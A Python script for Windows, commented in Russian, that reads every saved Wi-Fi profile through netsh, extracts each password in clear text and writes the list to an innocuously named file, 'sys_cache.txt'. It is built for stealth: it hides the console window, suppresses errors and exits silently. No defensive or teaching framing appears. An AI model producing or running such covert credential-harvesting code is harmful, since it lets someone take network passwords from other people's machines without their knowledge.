import subprocess
import os
import re
import tempfile
import sys

def get_wifi_profiles():
    """Получает список всех сохранённых Wi-Fi профилей через netsh."""
    try:
        # Используем CREATE_NO_WINDOW чтобы скрыть консоль
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0

        creationflags = subprocess.CREATE_NO_WINDOW

        output = subprocess.check_output(
            ["netsh", "wlan", "show", "profiles"],
            startupinfo=startupinfo,
            creationflags=creationflags,
            stderr=subprocess.DEVNULL,
            shell=False
        ).decode("cp866", errors="ignore")

        # Извлекаем имена профилей
        profiles = re.findall(r"All User Profile\s+:\s(.+)", output)
        return [p.strip() for p in profiles]
    except Exception:
        return []

def get_wifi_password(profile_name):
    """Получает пароль для конкретного Wi-Fi профиля."""
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0

        creationflags = subprocess.CREATE_NO_WINDOW

        output = subprocess.check_output(
            ["netsh", "wlan", "show", "profile", f"name={profile_name}", "key=clear"],
            startupinfo=startupinfo,
            creationflags=creationflags,
            stderr=subprocess.DEVNULL,
            shell=False
        ).decode("cp866", errors="ignore")

        # Ищем строку с ключом
        password_match = re.search(r"Key Content\s+:\s(.+)", output)
        if password_match:
            return password_match.group(1).strip()
        return "<no password / open network>"
    except Exception:
        return "<error retrieving>"

def save_to_file(results, filepath):
    """Сохраняет результаты в текстовый файл."""
    with open(filepath, "w", encoding="utf-8") as f:
        f.write("=" * 50 + "\n")
        f.write("   Wi-Fi Credentials Dump\n")
        f.write("=" * 50 + "\n\n")
        for ssid, password in results:
            f.write(f"SSID     : {ssid}\n")
            f.write(f"Password : {password}\n")
            f.write("-" * 40 + "\n")
        f.write(f"\nTotal profiles: {len(results)}\n")

def main():
    # Полностью скрываем окно консоли если запущено как .pyw или скомпилировано
    # Дополнительная скрытность: перенаправляем стандартные потоки
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except Exception:
            pass

    # Директория где запущен скрипт
    script_dir = os.path.dirname(os.path.abspath(sys.executable if getattr(sys, "frozen", False) else __file__))

    # Невзрачное имя файла
    output_file = os.path.join(script_dir, "sys_cache.txt")

    profiles = get_wifi_profiles()

    if not profiles:
        # Тихо создаём пустой файл чтобы не вызывать ошибок
        with open(output_file, "w", encoding="utf-8") as f:
            f.write("No Wi-Fi profiles found.\n")
        return

    results = []
    for profile in profiles:
        password = get_wifi_password(profile)
        results.append((profile, password))

    save_to_file(results, output_file)

    # Тихий выход, без сообщений
    sys.exit(0)

if __name__ == "__main__":
    main()
